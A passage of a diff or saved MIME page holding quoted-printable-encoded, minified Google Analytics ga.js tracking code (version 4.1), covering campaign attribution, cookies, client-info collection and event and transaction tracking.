+ActiveXObject(n);p=3Df.GetVariable(t)}catch(B){}if(p){p=3Dh.w(h.w(p," =
+")[1],",");p=3Dp[0]+"."+p[1]+" r"+p[2]}}return =
+p?p:c}a.oc=3Dfunction(){var =
+m;if(self.screen){a.Ka=3Da.Ja.width+"x"+a.Ja.height;a.Mb=3Da.Ja.colorDept=
+h+"-bit"}else =
+if(a.ob)try{m=3Da.ob.getScreenSize();a.Ka=3Dm.width+"x"+m.height}catch(r)=
+{}a.Ib=3Dh.S(a.n&&a.n.language?a.n.language:(a.n&&a.n.browserLanguage?a.n=
+.browserLanguage:c));a.Gb=3D=0A=
+a.n&&a.n.javaEnabled()?1:0;a.yb=3Do?j():c;a.rb=3Dh.d(a.a.characterSet?a.a=
+.characterSet:(a.a.charset?a.a.charset:c))};a.Lc=3Dfunction(){return"&"+[=
+"utmcs=3D"+h.d(a.rb),"utmsr=3D"+a.Ka,"utmsc=3D"+a.Mb,"utmul=3D"+a.Ib,"utm=
+je=3D"+a.Gb,"utmfl=3D"+h.d(a.yb)].join("&")}};_gat.k=3Dfunction(d,a,c,h,o=
+){var =
+j=3Dthis,m=3D_gat,r=3Dm.m,p=3Dm.b,f=3Dm.O,n=3Dm.B,t=3Dm.S,y=3Dm.w,g=3Dm.c=
+;j.a=3Da;j.e=3Dd;j.Lb=3Dc;j.ja=3Dh;j.r=3Do;function B(q){return =
+r(q)||"0"=3D=3Dq||!f(q,"://")}j.vc=3Dfunction(q){var =
+u=3Dj.Cb(),x=3Dj.r;return new =
+m.k.q(n(q,x.eb+"=3D","&"),n(q,x.hb+"=3D","&"),n(q,x.jb+"=3D","&"),j.ba(q,=
+x.cb,"(not set)"),j.ba(q,x.fb,"(not =
+set)"),j.ba(q,x.ib,u&&!r(u.Q)?m.z(u.Q):p),j.ba(q,x.db,p))};j.Cb=3Dfunctio=
+n(){var =
+q,u,x=3Dj.Lb,z,l,v=3Dj.r.fa;if(B(x))return;q=3Dt(y(x,"://")[1]);if(f(q,"/=
+"))q=3Dy(q,"/")[0];for(z=3D0;z<v[g];z++){l=3D=0A=
+v[z];if(f(q,t(l.wb))){x=3Dy(x,"?").join("&");if(f(x,"&"+l.Hb+"=3D")){u=3D=
+y(x,"&"+l.Hb+"=3D")[1];if(f(u,"&"))u=3Dy(u,"&")[0];return new =
+m.k.q(p,l.wb,p,"(organic)","organic",u,p)}}}};j.ba=3Dfunction(q,u,x){var =
+z=3Dn(q,u+"=3D","&"),l=3D!r(z)?m.z(z):(!r(x)?x:"-");return =
+l};j.Bc=3Dfunction(q){var =
+u=3Dj.r.ea,x=3Dfalse,z,l;if(q&&"organic"=3D=3Dq.da){z=3Dt(m.z(q.Q));for(l=
+=3D0;l<u[g];l++)x=3Dx||t(u[l])=3D=3Dz}return x};j.uc=3Dfunction(){var =
+q=3D"",u=3D"",x=3Dj.Lb;if(B(x))return;q=3Dt(y(x,"://")[1]);if(f(q,"/")){u=
+=3Dm.D(q,m.v(q,"/"));if(f(u,"?"))u=3Dy(u,"?")[0];=0A=
+q=3Dy(q,"/")[0]}if(0=3D=3Dm.v(q,"www."))q=3Dm.D(q,4);return new =
+m.k.q(p,q,p,"(referral)","referral",p,u)};j.kc=3Dfunction(q){var =
+u=3D"";if(j.r.pa){u=3Dm.Ab(q);u=3D""!=3Du?u+"&":u}u+=3Dq.search;return =
+u};j.qc=3Dfunction(){return new =
+m.k.q(p,"(direct)",p,"(direct)","(none)",p,p)};j.Cc=3Dfunction(q){var =
+u=3Dfalse,x,z,l=3Dj.r.ga;if(q&&"referral"=3D=3Dq.da){x=3Dt(m.d(q.ia));for=
+(z=3D0;z<l[g];z++)u=3Du||f(x,t(l[z]))}return u};j.T=3Dfunction(q){return =
+p!=3Dq&&q.Fa()};j.pc=3Dfunction(q,u){var =
+x=3D"",z=3D"-",l,v,k=3D0,b,e,i=3Dj.e;if(!q)return"";e=3Dj.a[m.p]?j.a[m.p]=
+:=0A=
+"";x=3Dj.kc(j.a.location);if(j.r.H&&q.Eb()){z=3Dq.Ca();if(!r(z)&&!f(z,";"=
+)){q.Ra();return""}}z=3Dn(e,m.X+i,";");l=3Dj.vc(x);if(j.T(l)){v=3Dn(x,j.r=
+.gb+"=3D","&");if("1"=3D=3Dv&&!r(z))return""}if(!j.T(l)){l=3Dj.Cb();if(!r=
+(z)&&j.Bc(l))return""}if(!j.T(l)&&u){l=3Dj.uc();if(!r(z)&&j.Cc(l))return"=
+"}if(!j.T(l))if(r(z)&&u)l=3Dj.qc();if(!j.T(l))return"";if(!r(z)){var =
+s=3Dy(z,"."),w=3Dnew =
+m.k.q;w.zb(s.slice(4).join("."));b=3Dt(w.ka())=3D=3Dt(l.ka());k=3Ds[3]*1}=
+if(!b||u){var =
+A=3Dn(e,m.o+i,";"),D=3DA.lastIndexOf("."),F=3DD>9?m.D(A,D+1)*1:0;k++;F=3D=
+0=3D=3D=0A=
+F?1:F;q.Rb([i,j.ja,F,k,l.ka()].join("."));q.Ra();return"&utmcn=3D1"}else =
+return"&utmcr=3D1"}};_gat.k.q=3Dfunction(d,a,c,h,o,j,m){var =
+r=3Dthis;r.u=3Dd;r.ia=3Da;r.ra=3Dc;r.K=3Dh;r.da=3Do;r.Q=3Dj;r.tb=3Dm};_ga=
+t.k.q.prototype.ka=3Dfunction(){var =
+d=3Dthis,a=3D_gat,c=3D[],h=3D[[a.Wa,d.u],[a.Ya,d.ia],[a.$a,d.ra],[a.Ua,d.=
+K],[a.Xa,d.da],[a.Za,d.Q],[a.Va,d.tb]],o;if(d.Fa())for(o=3D0;o<h[a.c];o++=
+)if(!a.m(h[o][1]))a.g(c,h[o][0]+a.d(a.z(h[o][1])));return =
+c.join("|")};_gat.k.q.prototype.Fa=3Dfunction(){var =
+d=3Dthis,a=3D_gat.m;return!(a(d.u)&&a(d.ia)&&=0A=
+a(d.ra))};_gat.k.q.prototype.zb=3Dfunction(d){var =
+a=3Dthis,c=3D_gat,h=3Dfunction(o){return =
+c.z(c.B(d,o,"|"))};a.u=3Dh(c.Wa);a.ia=3Dh(c.Ya);a.ra=3Dh(c.$a);a.K=3Dh(c.=
+Ua);a.da=3Dh(c.Xa);a.Q=3Dh(c.Za);a.tb=3Dh(c.Va)};_gat.Z=3Dfunction(){var =
+d=3Dthis,a=3D_gat,c=3D{},h=3D"k",o=3D"v",j=3D[h,o],m=3D"(",r=3D")",p=3D"*=
+",f=3D"!",n=3D"'",t=3D{};t[n]=3D"'0";t[r]=3D"'1";t[p]=3D"'2";t[f]=3D"'3";=
+var y=3D1;function =
+g(l,v,k,b){if(a.b=3D=3Dc[l])c[l]=3D{};if(a.b=3D=3Dc[l][v])c[l][v]=3D[];c[=
+l][v][k]=3Db}function B(l,v,k){if(a.b!=3Dc[l]&&a.b!=3Dc[l][v])return =
+c[l][v][k];else return a.b}function =
+q(l,v){if(a.b!=3Dc[l]&&a.b!=3Dc[l][v]){c[l][v]=3Da.b;var =
+k=3Dtrue,b;for(b=3D0;b<j[a.c];b++)if(a.b!=3Dc[l][j[b]]){k=3Dfalse;break}i=
+f(k)c[l]=3Da.b}}function u(l){var =
+v=3D"",k=3Dfalse,b,e;for(b=3D0;b<j[a.c];b++){e=3D=0A=
+l[j[b]];if(a.b!=3De){if(k)v+=3Dj[b];v+=3Dx(e);k=3Dfalse}else =
+k=3Dtrue}return v}function x(l){var =
+v=3D[],k,b;for(b=3D0;b<l[a.c];b++)if(a.b!=3Dl[b]){k=3D"";if(b!=3Dy&&a.b=3D=
+=3Dl[b-1]){k+=3Db.toString();k+=3Df}k+=3Dz(l[b]);a.g(v,k)}return =
+m+v.join(p)+r}function z(l){var =
+v=3D"",k,b,e;for(k=3D0;k<l[a.c];k++){b=3Dl.charAt(k);e=3Dt[b];if(a.b!=3De=
+)v+=3De;else v+=3Db}return v}d.yc=3Dfunction(l){return =
+a.b!=3Dc[l]};d.M=3Dfunction(){var l=3D[],v;for(v in =
+c)if(a.b!=3Dc[v])a.g(l,v.toString()+u(c[v]));return =
+l.join("")};d.Fc=3Dfunction(l){if(l=3D=3Da.b)return d.M();var v=3D=0A=
+[l.M()],k;for(k in =
+c)if(a.b!=3Dc[k]&&!l.yc(k))a.g(v,k.toString()+u(c[k]));return =
+v.join("")};d._setKey=3Dfunction(l,v,k){if(typeof k!=3D"string")return =
+false;g(l,h,v,k);return true};d._setValue=3Dfunction(l,v,k){if(typeof =
+k!=3D"number"&&(a.b=3D=3DNumber||!(k instanceof Number)))return =
+false;if(Math.round(k)!=3Dk||k=3D=3DNaN||k=3D=3DInfinity)return =
+false;g(l,o,v,k.toString());return =
+true};d._getKey=3Dfunction(l,v){return =
+B(l,h,v)};d._getValue=3Dfunction(l,v){return =
+B(l,o,v)};d._clearKey=3Dfunction(l){q(l,h)};d._clearValue=3Dfunction(l){q=
+(l,=0A=
+o)}};_gat.cc=3Dfunction(d,a){var =
+c=3Dthis;c.Wc=3Da;c.Dc=3Dd;c._trackEvent=3Dfunction(h,o,j){return =
+a._trackEvent(c.Dc,h,o,j)}};_gat.ec=3Dfunction(d){var =
+a=3Dthis,c=3D_gat,h=3Dc.b,o=3Dc.m,j=3Dc.v,m=3Dc.D,r=3Dc.B,p=3Dc.O,f=3Dc.w=
+,n=3D"location",t=3Dc.c,y=3Dh,g=3Dnew =
+c.bc,B=3Dfalse;a.a=3Ddocument;a.V=3Dwindow;a.ja=3DMath.round((new =
+Date).getTime()/1000);a.G=3Dd;a.va=3Dh;a.i=3Dh;a.Hc=3Dc.wa();a.A=3Dh;a.L=3D=
+false;a.aa=3Dh;a.pb=3D"";a.j=3Dh;a.xb=3Dh;a.e=3Dh;a.s=3Dh;function =
+q(){if("auto"=3D=3Dg.f){var =
+b=3Da.a.domain;if("www."=3D=3Dm(b,0,4))b=3Dm(b,4);g.f=3Db}g.f=3Dc.S(g.f)}=
+function u(){var =
+b=3Dg.f,e=3Dj(b,"www.google.")*j(b,".google.")*j(b,"google.");return =
+e||"/"!=3Dg.l||j(b,"google.org")>-1}function x(b,e,=0A=
+i){if(o(b)||o(e)||o(i))return"-";var =
+s=3Dr(b,c.o+a.e,e),w;if(!o(s)){w=3Df(s,".");w[5]=3Dw[5]?w[5]*1+1:1;w[3]=3D=
+w[4];w[4]=3Di;s=3Dw.join(".")}return s}function =
+z(){return"file:"!=3Da.a[n].protocol&&u()}function =
+l(b){if(!b||""=3D=3Db)return"";while(c.Fb(b.charAt(0)))b=3Dm(b,1);while(c=
+.Fb(b.charAt(b[t]-1)))b=3Dm(b,0,b[t]-1);return b}function =
+v(b,e,i){if(!o(b())){e(c.z(b()));if(!p(b(),";"))i()}}function k(b){var =
+e,i=3D""!=3Db&&a.a[n].host!=3Db;if(i)for(e=3D0;e<g.J[t];e++)i=3Di&&j(c.S(=
+b),c.S(g.J[e]))=3D=3D-1;return i}a.rc=3Dfunction(){if(!g.f||=0A=
+""=3D=3Dg.f||"none"=3D=3Dg.f){g.f=3D"";return 1}q();if(g.nb)return =
+c.t(g.f);else return =
+1};a.lc=3Dfunction(b,e){if(o(b))b=3D"-";else{e+=3Dg.l&&"/"!=3Dg.l?g.l:"";=
+var =
+i=3Dj(b,e);b=3Di>=3D0&&i<=3D8?"0":("["=3D=3Db.charAt(0)&&"]"=3D=3Db.charA=
+t(b[t]-1)?"-":b)}return b};a.Ia=3Dfunction(b){var =
+e=3D"",i=3Da.a;e+=3Da.aa?a.aa.Lc():"";e+=3Dg.qa?a.pb:"";e+=3Dg.ta&&!o(i.t=
+itle)?"&utmdt=3D"+c.d(i.title):"";e+=3D"&utmhid=3D"+c.mc()+"&utmr=3D"+a.v=
+a+"&utmp=3D"+a.Gc(b);return e};a.Gc=3Dfunction(b){var =
+e=3Da.a[n];b=3Dh!=3Db&&""!=3Db?c.d(b,true):c.d(e.pathname+unescape(e.sear=
+ch),true);=0A=
+return b};a.Oc=3Dfunction(b){if(a.P()){var =
+e=3D"";if(a.j!=3Dh&&a.j.M().length>0)e+=3D"&utme=3D"+c.d(a.j.M());e+=3Da.=
+Ia(b);y.N(e,a.G,a.a,a.e)}};a.jc=3Dfunction(){var b=3Dnew =
+c.Y(a.a,g);return =
+b.Ha(a.e)?b.Kc():h};a._getLinkerUrl=3Dfunction(b,e){var =
+i=3Df(b,"#"),s=3Db,w=3Da.jc();if(w)if(e&&1>=3Di[t])s+=3D"#"+w;else =
+if(!e||1>=3Di[t])if(1>=3Di[t])s+=3D(p(b,"?")?"&":"?")+w;else =
+s=3Di[0]+(p(b,"?")?"&":"?")+w+"#"+i[1];return s};a.Tb=3Dfunction(){var =
+b;if(a.A&&a.A[t]>=3D10&&!p(a.A,"=3D")){a.s.Ic(a.A);a.s.Qc();c._gasoDomain=
+=3Dg.f;c._gasoCPath=3Dg.l;b=3D=0A=
+a.a.createElement("script");b.type=3D"text/javascript";b.id=3D"_gasojs";b=
+.src=3D"https://www.google.com/analytics/reporting/overlay_js?gaso=3D"+a.=
+A+"&"+c.wa();a.a.getElementsByTagName("head")[0].appendChild(b)}};a.xc=3D=
+function(){var =
+b=3Da.a[c.p],e=3Da.ja,i=3Da.s,s=3Da.e+"",w=3Da.V,A=3Dw?w.gaGlobal:h,D,F=3D=
+p(b,c.o+s),I=3Dp(b,c.W+s),J=3Dp(b,c.ma+s),E,C=3D[],G=3D"",H;b=3Do(b)?"":b=
+;if(g.H){D=3Dc.Ab(a.a[n]);if(g.pa&&!o(D))G=3DD+"&";G+=3Da.a[n].search;if(=
+!o(G)&&p(G,c.o)){i.Ec(G);if(!i.Eb())i.ic();E=3Di.ya()}v(i.Ba,i.Qb,i.$b);v=
+(i.Aa,i.Na,i.Qa)}if(!o(E))if(o(i.I())||=0A=
+o(i.za())){E=3Dx(G,"&",e);a.L=3Dtrue}else{C=3Df(i.I(),".");s=3DC[0]}else =
+if(F)if(!I||!J){E=3Dx(b,";",e);a.L=3Dtrue}else{E=3Dr(b,c.o+s,";");C=3Df(r=
+(b,c.W+s,";"),".")}else{E=3D[s,a.Hc,e,e,e,1].join(".");a.L=3Dtrue}E=3Df(E=
+,".");if(w&&A){E[4]=3DA.sid?A.sid:E[4];if(A.vid){H=3Df(A.vid,".");E[1]=3D=
+H[0];E[2]=3DH[1]}}i.Ob(E.join("."));C[0]=3Ds;C[1]=3DC[1]?C[1]:0;C[2]=3Dun=
+defined!=3DC[2]?C[2]:g.Mc;C[3]=3DC[3]?C[3]:(new =
+Date).getTime();i.La(C.join("."));i.Pb(s);if(!o(i.wc()))i.Ma(i.t());i.Yb(=
+);i.Pa();i.Zb()};a.zc=3Dfunction(){y=3Dnew c.dc(g)};a._initData=3D=0A=
+function(){var b;if(!B){a.zc();a.e=3Da.rc();a.s=3Dnew =
+c.Y(a.a,g)}if(z())a.xc();if(!B){if(z()){a.va=3Da.lc(a.a.referrer,a.a.doma=
+in);if(g.sa){a.aa=3Dnew c.ac(g.ua);a.aa.oc()}if(g.qa){b=3Dnew =
+c.k(a.e,a.a,a.va,a.ja,g);a.pb=3Db.pc(a.s,a.L)}}a.j=3Dnew c.Z;a.xb=3Dnew =
+c.Z;B=3Dtrue}if(!c.Db)a.Ac()};a._visitCode=3Dfunction(){a._initData();var=
+ b=3Dr(a.a[c.p],c.o+a.e,";"),e=3Df(b,".");return =
+e[t]<4?"":e[1]};a._cookiePathCopy=3Dfunction(b){a._initData();if(a.s)a.s.=
+Pc(a.e,b)};a.Ac=3Dfunction(){var =
+b=3Da.a[n].hash,e;e=3Db&&""!=3Db&&0=3D=3Dj(b,"#gaso=3D")?=0A=
+r(b,"gaso=3D","&"):r(a.a[c.p],c.Sa,";");if(e[t]>=3D10){a.A=3De;if(a.V.add=
+EventListener)a.V.addEventListener("load",a.Tb,false);else =
+a.V.attachEvent("onload",a.Tb)}c.Db=3Dtrue};a.P=3Dfunction(){return =
+a._visitCode()%10000<g.ha*100};a.Jc=3Dfunction(){var =
+b,e,i=3Da.a.links;for(b=3D0;b<i[t]&&(g.Ga=3D=3D-1||b<g.Ga);b++){e=3Di[b];=
+if(k(e.host))if(!e.gatcOnclick){e.gatcOnclick=3De.onclick;e.onclick=3Dfun=
+ction(s){a._trackOutboundUrl(this.href);if(this.gatcOnclick)return =
+this.gatcOnclick(s)}}}};a._trackPageview=3Dfunction(b){if(z()){a._initDat=
+a();=0A=
+if(g.J&&g.J[t]>0)a.Jc();a.Oc(b);a.L=3Dfalse}};a._trackTrans=3Dfunction(){=
+var =
+b=3Da.e,e=3D[],i,s,w,A;a._initData();if(a.i&&a.P()){for(i=3D0;i<a.i.la[t]=
+;i++){s=3Da.i.la[i];c.g(e,s.R());for(w=3D0;w<s.ca[t];w++)c.g(e,s.ca[w].R(=
+))}for(A=3D0;A<e[t];A++)y.N(e[A],a.G,a.a,b,true)}};a._setTrans=3Dfunction=
+(){var =
+b=3Da.a,e,i,s,w,A=3Db.getElementById?b.getElementById("utmtrans"):(b.utmf=
+orm&&b.utmform.utmtrans?b.utmform.utmtrans:h);a._initData();if(A&&A.value=
+){a.i=3Dnew =
+c.h;w=3Df(A.value,"UTM:");g.F=3D!g.F||""=3D=3Dg.F?"|":g.F;for(e=3D0;e<w[t=
+];e++){w[e]=3D=0A=
+l(w[e]);i=3Df(w[e],g.F);for(s=3D0;s<i[t];s++)i[s]=3Dl(i[s]);if("T"=3D=3Di=
+[0])a._addTrans(i[1],i[2],i[3],i[4],i[5],i[6],i[7],i[8]);else =
+if("I"=3D=3Di[0])a._addItem(i[1],i[2],i[3],i[4],i[5],i[6])}}};a._addTrans=
+=3Dfunction(b,e,i,s,w,A,D,F){a.i=3Da.i?a.i:new c.h;return =
+a.i.lb(b,e,i,s,w,A,D,F)};a._addItem=3Dfunction(b,e,i,s,w,A){var =
+D;a.i=3Da.i?a.i:new =
+c.h;D=3Da.i.xa(b);if(!D)D=3Da._addTrans(b,"","","","","","","");D.kb(e,i,=
+s,w,A)};a._setVar=3Dfunction(b){if(b&&""!=3Db&&u()){var e=3Dnew =
+c.Y(a.a,g),i=3Da.e;e.Na(i+"."+c.d(b));e.Qa();if(a.P())y.N("&utmt=3Dvar",=0A=
+a.G,a.a,a.e)}};a._link=3Dfunction(b,e){if(g.H&&b){a._initData();a.a[n].hr=
+ef=3Da._getLinkerUrl(b,e)}};a._linkByPost=3Dfunction(b,e){if(g.H&&b&&b.ac=
+tion){a._initData();b.action=3Da._getLinkerUrl(b.action,e)}};a._setXKey=3D=
+function(b,e,i){a.j._setKey(b,e,i)};a._setXValue=3Dfunction(b,e,i){a.j._s=
+etValue(b,e,i)};a._getXKey=3Dfunction(b,e){return =
+a.j._getKey(b,e)};a._getXValue=3Dfunction(b,e){return =
+a.j.getValue(b,e)};a._clearXKey=3Dfunction(b){a.j._clearKey(b)};a._clearX=
+Value=3Dfunction(b){a.j._clearValue(b)};a._createXObj=3D=0A=
+function(){a._initData();return new c.Z};a._sendXEvent=3Dfunction(b){var =
+e=3D"";a._initData();if(a.P()){e+=3D"&utmt=3Devent&utme=3D"+c.d(a.j.Fc(b)=
+)+a.Ia();y.N(e,a.G,a.a,a.e,false,true)}};a._createEventTracker=3Dfunction=
+(b){a._initData();return new =
+c.cc(b,a)};a._trackEvent=3Dfunction(b,e,i,s){var =
+w=3Dtrue,A=3Da.xb;if(h!=3Db&&h!=3De&&""!=3Db&&""!=3De){A._clearKey(5);A._=
+clearValue(5);w=3DA._setKey(5,1,b)?w:false;w=3DA._setKey(5,2,e)?w:false;w=
+=3Dh=3D=3Di||A._setKey(5,3,i)?w:false;w=3Dh=3D=3Ds||A._setValue(5,1,s)?w:=
+false;if(w)a._sendXEvent(A)}else w=3D=0A=
+false;return =
+w};a._trackOutboundUrl=3Dfunction(b){a._initData();if(a.P()){var e=3Dnew =
+c.Z;e._setKey(6,1,b);y.N("&utmt=3Devent&utme=3D"+c.d(e.M())+a.Ia(),a.G,a.=
+a,a.e,false,true)}};a._setDomainName=3Dfunction(b){g.f=3Db};a.Rc=3Dfuncti=
+on(){return g.f};a._addOrganic=3Dfunction(b,e){c.g(g.fa,new =
+c.bb(b,e))};a._clearOrganic=3Dfunction(){g.fa=3D[]};a.Vc=3Dfunction(){ret=
+urn =
+g.fa};a._addIgnoredOrganic=3Dfunction(b){c.g(g.ea,b)};a._clearIgnoredOrga=
+nic=3Dfunction(){g.ea=3D[]};a.Sc=3Dfunction(){return =
+g.ea};a._addIgnoredRef=3Dfunction(b){c.g(g.ga,=0A=
+b)};a._clearIgnoredRef=3Dfunction(){g.ga=3D[]};a.Tc=3Dfunction(){return =
+g.ga};a._setAllowHash=3Dfunction(b){g.nb=3Db?1:0};a._setCampaignTrack=3Df=
+unction(b){g.qa=3Db?1:0};a._setClientInfo=3Dfunction(b){g.sa=3Db?1:0};a._=
+getClientInfo=3Dfunction(){return =
+g.sa};a._setCookiePath=3Dfunction(b){g.l=3Db};a._setTransactionDelim=3Dfu=
+nction(b){g.F=3Db};a._setCookieTimeout=3Dfunction(b){g.ub=3Db};a._setDete=
+ctFlash=3Dfunction(b){g.ua=3Db?1:0};a._getDetectFlash=3Dfunction(b){retur=
+n g.ua};a._setDetectTitle=3Dfunction(b){g.ta=3Db?1:0};a._getDetectTitle=3D=0A=
+function(){return =
+g.ta};a._setLocalGifPath=3Dfunction(b){g.Da=3Db};a._getLocalGifPath=3Dfun=
+ction(){return =
+g.Da};a._setLocalServerMode=3Dfunction(){g.C=3D0};a._setRemoteServerMode=3D=
+function(){g.C=3D1};a._setLocalRemoteServerMode=3Dfunction(){g.C=3D2};a.U=
+c=3Dfunction(){return g.C};a._getServiceMode=3Dfunction(){return =
+g.C};a._setSampleRate=3Dfunction(b){g.ha=3Db};a._setSessionTimeout=3Dfunc=
+tion(b){g.Nb=3Db};a._setAllowLinker=3Dfunction(b){g.H=3Db?1:0};a._setAllo=
+wAnchor=3Dfunction(b){g.pa=3Db?1:0};a._setCampNameKey=3Dfunction(b){g.cb=3D=
+b};=0A=
+a._setCampContentKey=3Dfunction(b){g.db=3Db};a._setCampIdKey=3Dfunction(b=
+){g.eb=3Db};a._setCampMediumKey=3Dfunction(b){g.fb=3Db};a._setCampNOKey=3D=
+function(b){g.gb=3Db};a._setCampSourceKey=3Dfunction(b){g.hb=3Db};a._setC=
+ampTermKey=3Dfunction(b){g.ib=3Db};a._setCampCIdKey=3Dfunction(b){g.jb=3D=
+b};a._getAccount=3Dfunction(){return =
+a.G};a._getVersion=3Dfunction(){return"4.1"};a.Xc=3Dfunction(b){g.J=3Db};=
+a.Yc=3Dfunction(b){g.Ga=3Db}};_gat._getTracker=3Dfunction(d){var a=3Dnew =
+_gat.ec(d);return a};=0A=
+
+------=_NextPart_000_0000_01C8B5AD.98E80010--
